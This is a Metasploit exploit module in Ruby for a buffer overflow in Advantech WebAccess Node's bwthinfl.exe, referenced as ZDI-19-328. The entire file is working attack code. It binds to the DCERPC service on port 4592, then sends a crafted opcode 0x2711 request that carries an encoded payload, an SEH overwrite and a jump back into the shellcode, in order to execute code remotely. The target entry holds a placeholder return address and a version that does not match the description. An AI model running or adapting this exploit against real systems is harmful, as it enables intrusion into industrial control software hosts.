require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::DCERPC

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Advantech WebAccess Node bwthinfl.exe Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in AdvantechWebAccessUSANode8.1_20151230. By
          sending a specially crafted DCERPC request using opcode 0x2711, an attacker may
          be able to execute arbitrary code.
      },
      'Author'         =>
        [
          'Mario Ceballos' 
        ],
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          ['ZDI', '19-328']
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
	  'EXITFUNC' => 'process',
	},
      'Payload'        =>
        {
          'BadChars' => "\x00",
          'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
          'Space'       => 450,
        },
      'Platform'      => %w{ win },
      'Targets'        =>
        [
         [ 'AdvantechWebAccessUSANode8.0_20150816.exe', { 'Ret' => 0xfeedface } ], # Windows7 SP1
        ],
      'DisclosureDate' => 'Apr 2 2019',
      'DefaultTarget'  => 0
      ))
    register_options( [ Opt::RPORT(4592) ], self.class )

  end

  def exploit
   connect
   handle = dcerpc_handle('5d2b62aa-ee0a-4a95-91ae-b064fdb471fc', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
   dcerpc_bind(handle)
   print_status("Bound to #{handle} ...")

   packet =  NDR.long(0)
   packet << NDR.long(0xc351)
   packet << NDR.long(0x04)

   begin
     resp = dcerpc.call(0x2, packet)
   rescue Rex::Proto::DCERPC::Exceptions::NoResponse
   ensure
   end

   begin
     resp = dcerpc.call(0x4, NDR.long(2))
     handle = resp.last(4).unpack('V').first

     data = rand_text_alpha_upper(4096)
     data[2822-payload.encoded.size, payload.encoded.size] = payload.encoded
     data[2822, 4] = [0x414106eb].pack('V')
     data[2826, 4] = [0x100111c5].pack('V')
     data[2830, 5] = [0xe8, -450].pack('CV')

     packet2 =  NDR.long(handle)
     packet2 << NDR.long(0x2711) 
     packet2 << NDR.long(0x204)
     packet2 << NDR.long(0x204)
     packet2 << "bwthinfl #{data} #{rand_text_alpha_upper(2)} 0"
     packet2 << NDR.long(0) * 125

     print_status("Trying target #{target.name}...")
    begin
     dcerpc_call(0x1, packet2)
    rescue Rex::Proto::DCERPC::Exceptions::NoResponse
    end
   end
  end
end
